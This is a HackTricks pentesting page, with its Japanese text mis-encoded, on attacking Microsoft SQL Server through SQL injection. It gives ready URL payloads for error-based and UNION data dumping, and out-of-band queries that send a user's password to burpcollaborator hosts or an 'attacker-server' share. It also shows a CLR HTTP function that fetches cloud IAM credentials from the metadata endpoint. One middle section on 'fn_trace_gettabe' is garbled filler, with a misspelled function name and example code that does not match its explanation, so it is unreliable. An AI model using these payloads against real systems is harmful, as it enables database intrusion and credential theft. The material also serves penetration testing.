# MSSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## Active Directoryã®åˆ—æŒ™

MSSQLã‚µãƒ¼ãƒãƒ¼å†…ã§ã®SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€æ¬¡ã®MSSQLé–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’åˆ—æŒ™ã™ã‚‹ã“ã¨ãŒã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

* **`SELECT DEFAULT_DOMAIN()`**: ç¾åœ¨ã®ãƒ‰ãƒ¡ã‚¤ãƒ³åã‚’å–å¾—ã—ã¾ã™ã€‚
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: ãƒ‰ãƒ¡ã‚¤ãƒ³ã®åå‰ã‚’çŸ¥ã£ã¦ã„ã‚‹å ´åˆï¼ˆã“ã®ä¾‹ã§ã¯_DOMAIN_ï¼‰ã€ã“ã®é–¢æ•°ã¯16é€²æ•°å½¢å¼ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼Administratorã®**SIDã‚’è¿”ã—ã¾ã™**ã€‚ã“ã‚Œã¯`0x01050000000[...]0000f401`ã®ã‚ˆã†ã«è¦‹ãˆã¾ã™ã€‚æœ€å¾Œã®4ãƒã‚¤ãƒˆã¯ã€**ãƒ“ãƒƒã‚°ã‚¨ãƒ³ãƒ‡ã‚£ã‚¢ãƒ³å½¢å¼**ã§ã®æ•°å€¤**500**ã§ã‚ã‚Šã€ã“ã‚Œã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼administratorã®**ä¸€èˆ¬çš„ãªID**ã§ã™ã€‚\
ã“ã®é–¢æ•°ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æœ€å¾Œã®4ãƒã‚¤ãƒˆä»¥å¤–ã®**ãƒ‰ãƒ¡ã‚¤ãƒ³ã®IDã‚’çŸ¥ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : ã“ã®é–¢æ•°ã¯ã€æŒ‡å®šã•ã‚ŒãŸIDã®**ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’è¿”ã—ã¾ã™**ï¼ˆå­˜åœ¨ã™ã‚‹å ´åˆï¼‰ã€‚ã“ã®å ´åˆã€**0000e803**ã¯ãƒ“ãƒƒã‚°ã‚¨ãƒ³ãƒ‡ã‚£ã‚¢ãƒ³ã§**1000**ã§ã™ï¼ˆé€šå¸¸ã€ã“ã‚Œã¯æœ€åˆã®é€šå¸¸ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼IDã®IDã§ã™ï¼‰ã€‚ãã®å¾Œã€1000ã‹ã‚‰2000ã¾ã§ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼IDã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—ã€ãŠãã‚‰ããƒ‰ãƒ¡ã‚¤ãƒ³ã®ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’å–å¾—ã§ãã‚‹ã¨æƒ³åƒã§ãã¾ã™ã€‚ãŸã¨ãˆã°ã€æ¬¡ã®ã‚ˆã†ãªé–¢æ•°ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **ä»£æ›¿ã‚¨ãƒ©ãƒ¼ãƒ™ãƒ¼ã‚¹ã®ãƒ™ã‚¯ãƒˆãƒ«**

ã‚¨ãƒ©ãƒ¼ãƒ™ãƒ¼ã‚¹ã®SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯é€šå¸¸ã€`+AND+1=@@version--`ã¨ã„ã£ãŸæ§‹é€ ã‚’æŒã¡ã€ã¾ãŸã€ŒORã€æ¼”ç®—å­ã«åŸºã¥ããƒãƒªã‚¢ãƒ³ãƒˆã‚‚å­˜åœ¨ã—ã¾ã™ã€‚ã“ã®ã‚ˆã†ãªå¼ã‚’å«ã‚€ã‚¯ã‚¨ãƒªã¯é€šå¸¸ã€WAFã«ã‚ˆã£ã¦ãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œã¾ã™ã€‚ãƒã‚¤ãƒ‘ã‚¹ã¨ã—ã¦ã€ç‰¹å®šã®é–¢æ•°å‘¼ã³å‡ºã—ã®çµæœã«%2bæ–‡å­—ã‚’ä½¿ç”¨ã—ã¦æ–‡å­—åˆ—ã‚’é€£çµã—ã€æ±‚ã‚ã¦ã„ã‚‹ãƒ‡ãƒ¼ã‚¿ã«ãƒ‡ãƒ¼ã‚¿å‹å¤‰æ›ã‚¨ãƒ©ãƒ¼ã‚’å¼•ãèµ·ã“ã™é–¢æ•°ã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã¾ã™ã€‚

ã“ã®ã‚ˆã†ãªé–¢æ•°ã®ä¾‹ï¼š

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

é–¢æ•°`USER_NAME()`ã®ä½¿ç”¨ä¾‹ï¼š
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

### `fn_xe_file_target_read_file`

SSRFï¼ˆServer-Side Request Forgeryï¼‰ã¯ã€æ”»æ’ƒè€…ãŒã‚µãƒ¼ãƒãƒ¼å†…ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã‚µãƒ¼ãƒãƒ¼ã‚’åˆ©ç”¨ã™ã‚‹æ”»æ’ƒæ‰‹æ³•ã§ã™ã€‚

ã“ã®æ”»æ’ƒæ‰‹æ³•ã¯ã€`fn_xe_file_target_read_file`ã¨ã„ã†é–¢æ•°ã‚’æ‚ªç”¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã“ã®é–¢æ•°ã¯ã€SQL Serverã®æ‹¡å¼µã‚¤ãƒ™ãƒ³ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ã‚’èª­ã¿å–ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€ã“ã®é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã‚µãƒ¼ãƒãƒ¼å†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€æ©Ÿå¯†æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®æ”»æ’ƒæ‰‹æ³•ã‚’é˜²ããŸã‚ã«ã¯ã€é©åˆ‡ãªå…¥åŠ›æ¤œè¨¼ã¨ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã®å®Ÿè£…ãŒå¿…è¦ã§ã™ã€‚
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/3.png)

**æ¨©é™:** ã‚µãƒ¼ãƒãƒ¼ä¸Šã§**`VIEW SERVER STATE`**æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

`fn_get_audit_file`ã¯ã€Microsoft SQL Serverã®çµ„ã¿è¾¼ã¿é–¢æ•°ã®1ã¤ã§ã™ã€‚ã“ã®é–¢æ•°ã¯ã€æŒ‡å®šã•ã‚ŒãŸãƒ‘ã‚¹ã«ã‚ã‚‹ç›£æŸ»ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã‚’è¿”ã—ã¾ã™ã€‚ã“ã®é–¢æ•°ã¯ã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã®æ½œåœ¨çš„ãªè„†å¼±æ€§ã‚’æŒã£ã¦ã„ã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€`fn_get_audit_file`é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã€SQLã‚¯ã‚¨ãƒªå†…ã«æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã®æ©Ÿå¯†æƒ…å ±ã‚’å–å¾—ã—ãŸã‚Šã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ç ´å£Šã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€å…¥åŠ›æ¤œè¨¼ã¨ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ã‚¯ã‚¨ãƒªã®ä½¿ç”¨ãŒé‡è¦ã§ã™ã€‚å…¥åŠ›æ¤œè¨¼ã¯ã€å…¥åŠ›ãƒ‡ãƒ¼ã‚¿ãŒäºˆæœŸã—ãªã„ã‚³ãƒ¼ãƒ‰ã‚’å«ã‚“ã§ã„ãªã„ã“ã¨ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«è¡Œã‚ã‚Œã¾ã™ã€‚ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ã‚¯ã‚¨ãƒªã¯ã€SQLã‚¯ã‚¨ãƒªå†…ã®å¤‰æ•°ã‚’ä½¿ç”¨ã—ã¦ã‚¯ã‚¨ãƒªã‚’æ§‹ç¯‰ã™ã‚‹æ–¹æ³•ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ãŒSQLã‚³ãƒ¼ãƒ‰ã‚’ç›´æ¥æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒã§ããªããªã‚Šã¾ã™ã€‚

SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®é‡è¦ãªè„…å¨ã§ã™ã€‚é–‹ç™ºè€…ã¨ã‚·ã‚¹ãƒ†ãƒ ç®¡ç†è€…ã¯ã€é©åˆ‡ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ã§ã€ã“ã®è„…å¨ã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ä¿è­·ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/2.png)

**æ¨©é™:** **`CONTROL SERVER`** æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

`fn_trace_gettabe` is a built-in function in Microsoft SQL Server that allows you to retrieve information from trace files. This function can be vulnerable to SQL injection attacks if user input is not properly sanitized.

To exploit this vulnerability, an attacker can manipulate the input parameter of the `fn_trace_gettabe` function to execute arbitrary SQL queries. This can lead to unauthorized access, data manipulation, or even complete compromise of the database.

To prevent SQL injection attacks, it is crucial to use parameterized queries or prepared statements when interacting with user input. These techniques ensure that user input is treated as data and not as executable code.

Here is an example of a vulnerable code snippet:

```sql
DECLARE @traceid INT
DECLARE @tablename NVARCHAR(100)
SET @traceid = 1
SET @tablename = 'mytable'

DECLARE @sql NVARCHAR(MAX)
SET @sql = 'SELECT * FROM fn_trace_gettabe(' + CAST(@traceid AS NVARCHAR(10)) + ', default)'

EXEC sp_executesql @sql
```

In this example, the `@tablename` variable is directly concatenated into the SQL query without any sanitization. An attacker can exploit this by providing a malicious input that alters the intended query.

To mitigate this vulnerability, the code should be modified to use parameterized queries:

```sql
DECLARE @traceid INT
DECLARE @tablename NVARCHAR(100)
SET @traceid = 1
SET @tablename = 'mytable'

DECLARE @sql NVARCHAR(MAX)
SET @sql = 'SELECT * FROM fn_trace_gettabe(@traceid, default)'

EXEC sp_executesql @sql, N'@traceid INT', @traceid
```

By using parameterized queries, the user input is treated as a parameter and not as part of the SQL query, effectively preventing SQL injection attacks.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/1.png)

**æ¨©é™:** **`CONTROL SERVER`** æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

MSSQLã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚³ãƒ¼ãƒ«ã‚’è¡Œã†ãŸã‚ã®æœ€ã‚‚ä¸€èˆ¬çš„ãªæ–¹æ³•ã¯ã€æ ¼ç´ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£`xp_dirtree`ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã¯Microsoftã«ã‚ˆã£ã¦å…¬å¼ã«ã¯æ–‡æ›¸åŒ–ã•ã‚Œã¦ã„ãªã„ãŸã‚ã€[ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®ä»–ã®äººã€…ã«ã‚ˆã£ã¦æ–‡æ›¸åŒ–ã•ã‚Œã¦ã„ã¾ã™](https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/)ã€‚ã“ã®æ–¹æ³•ã¯ã€[Out of Band Data exfiltration](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/)ã®æŠ•ç¨¿ã§[è¤‡æ•°ã®ä¾‹](https://www.notsosecure.com/oob-exploitation-cheatsheet/)ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚

åŸºæœ¬çš„ã«ã¯ã€
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\'+@user+'.attacker-server\aa"');
```
MySQLã®`LOAD_FILE`ã¨åŒæ§˜ã«ã€`xp_dirtree`ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’TCPãƒãƒ¼ãƒˆ445ã«é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒãƒ¼ãƒˆç•ªå·ã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ãŒã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å…±æœ‰ã‹ã‚‰æƒ…å ±ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**æ³¨æ„ï¼š**ã“ã‚Œã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®è¨­å®šã§`Windows Server 2016 Datacenter`ä¸Šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹`Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)`ã§ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“ã€‚

ä»–ã«ã‚‚ã€[**`master..xp_fileexist`ã®ã‚ˆã†ãª**](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx)ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ã‚„**`xp_subdirs`**ãªã©ã€åŒæ§˜ã®çµæœã‚’å¾—ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ãŒã‚ã‚Šã¾ã™ã€‚

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

ã‚‚ã¡ã‚ã‚“ã€**`xp_cmdshell`**ã‚’ä½¿ç”¨ã—ã¦**SSRFã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ä½•ã‹ã‚’å®Ÿè¡Œ**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€æ¬¡ã®ãƒšãƒ¼ã‚¸ã®è©²å½“ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’**èª­ã‚“ã§ãã ã•ã„**ï¼š

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQLãƒ¦ãƒ¼ã‚¶ãƒ¼å®šç¾©é–¢æ•° - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

CLR UDFï¼ˆCommon Language Runtime User Defined Function - .NETè¨€èªã§æ›¸ã‹ã‚Œã€DLLã«ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ï¼‰ã‚’æ›¸ãã€MSSQLå†…ã§ã‚«ã‚¹ã‚¿ãƒ é–¢æ•°ã¨ã—ã¦ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ã¯éå¸¸ã«ç°¡å˜ã§ã™ã€‚ãŸã ã—ã€ã“ã‚Œã«ã¯`dbo`ã‚¢ã‚¯ã‚»ã‚¹ãŒå¿…è¦ã§ã™ã®ã§ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¸ã®æ¥ç¶šãŒ`sa`ã¾ãŸã¯ç®¡ç†è€…ã®å½¹å‰²ã§ã‚ã‚‹å ´åˆã«ã®ã¿æ©Ÿèƒ½ã—ã¾ã™ã€‚

[ã“ã®Githubãƒªãƒã‚¸ãƒˆãƒªã«ã¯ã€Visual Studioãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã¨ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«æ‰‹é †ãŒã‚ã‚Šã¾ã™](https://github.com/infiniteloopltd/SQLHttp)ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒã‚¤ãƒŠãƒªã‚’CLRã‚¢ã‚»ãƒ³ãƒ–ãƒªã¨ã—ã¦MSSQLã«ãƒ­ãƒ¼ãƒ‰ã—ã€MSSQLå†…ã‹ã‚‰HTTP GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚

[`http.cs`ã®ã‚³ãƒ¼ãƒ‰ã§ã¯ã€`WebClient`ã‚¯ãƒ©ã‚¹ã‚’ä½¿ç”¨ã—ã¦GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã„ã€ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’å–å¾—ã—ã¾ã™](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)ã€‚
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString (html);
}
}
```
ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«æ‰‹é †ã§ã¯ã€`CREATE ASSEMBLY` ã‚¯ã‚¨ãƒªã®å‰ã«ä»¥ä¸‹ã‚’å®Ÿè¡Œã—ã¦ã€ã‚¢ã‚»ãƒ³ãƒ–ãƒªã®SHA512ãƒãƒƒã‚·ãƒ¥ã‚’ã‚µãƒ¼ãƒãƒ¼ã®ä¿¡é ¼ã•ã‚ŒãŸã‚¢ã‚»ãƒ³ãƒ–ãƒªã®ãƒªã‚¹ãƒˆã«è¿½åŠ ã—ã¾ã™ï¼ˆ`select * from sys.trusted_assemblies;` ã‚’ä½¿ç”¨ã—ã¦ãƒªã‚¹ãƒˆã‚’ç¢ºèªã§ãã¾ã™ï¼‰ã€‚
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
ã‚¢ã‚»ãƒ³ãƒ–ãƒªãŒè¿½åŠ ã•ã‚Œã€é–¢æ•°ãŒä½œæˆã•ã‚ŒãŸã‚‰ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¦HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã„ã¾ã™ã€‚
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/15.png)

## **ã‚¯ã‚¤ãƒƒã‚¯ãªæ”»æ’ƒ: 1ã¤ã®ã‚¯ã‚¨ãƒªã§ãƒ†ãƒ¼ãƒ–ãƒ«å…¨ä½“ã‚’å–å¾—ã™ã‚‹**

1ã¤ã®ã‚¯ã‚¨ãƒªã§ãƒ†ãƒ¼ãƒ–ãƒ«ã®å…¨å†…å®¹ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã¯ã€FOR XMLã¾ãŸã¯FOR JSONå¥ã‚’ä½¿ç”¨ã™ã‚‹æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚FOR XMLå¥ã¯ã€Œrawã€ã¨ã„ã£ãŸæŒ‡å®šã•ã‚ŒãŸãƒ¢ãƒ¼ãƒ‰ãŒå¿…è¦ã§ã™ãŒã€ç°¡æ½”ã•ã®è¦³ç‚¹ã‹ã‚‰FOR JSONãŒå„ªã‚Œã¦ã„ã¾ã™ã€‚

ç¾åœ¨ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰ã‚¹ã‚­ãƒ¼ãƒã€ãƒ†ãƒ¼ãƒ–ãƒ«ã€åˆ—ã‚’å–å¾—ã™ã‚‹ã‚¯ã‚¨ãƒª:
```
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/5.png)

ã‚¨ãƒ©ãƒ¼ãƒ™ãƒ¼ã‚¹ã®ãƒ™ã‚¯ã‚¿ãƒ¼ã¯ã€ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã¾ãŸã¯åå‰ãŒå¿…è¦ã§ã™ã€‚ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã‚„åå‰ãŒãªã„å ´åˆã€å¼ã®å‡ºåŠ›ã‚’JSONå½¢å¼ã§ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚
```
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/7.png)

## **ç¾åœ¨ã®ã‚¯ã‚¨ãƒªã®å–å¾—**

å®Ÿè¡Œä¸­ã®SQLã‚¯ã‚¨ãƒªã¯ã€`sys.dm_exec_requests`ã¨`sys.dm_exec_sql_text`ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‹ã‚‰å–å¾—ã§ãã¾ã™ã€‚
```
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/9.png)

